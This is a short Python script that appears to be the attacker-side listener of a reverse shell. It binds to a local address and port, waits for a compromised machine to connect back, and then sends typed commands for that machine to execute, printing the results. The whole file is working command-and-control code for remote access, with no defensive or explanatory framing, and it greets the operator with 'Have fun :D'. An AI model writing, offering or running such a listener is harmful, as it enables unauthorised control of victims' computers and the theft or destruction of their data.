#!/usr/bin/env python3
import socket

ipAddr = '192.168.1.2'
port = 4213

class Listener():
    def __init__(self, ip, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((ip, port))
        s.listen(1)

        print('[+] Waiting for a connection...')

        self.connection, address = s.accept()

        print('[+] Connection Established! Have fun :D')
    
    def executeRemotely(self, command):
        self.connection.send(bytes(command, encoding='utf8'))
        return self.connection.recv(1024)

    def run(self):
        while True:
            command = input('>> ')
            result = self.executeRemotely(command)
            print(result.decode())

l = Listener(ipAddr, port)
l.run()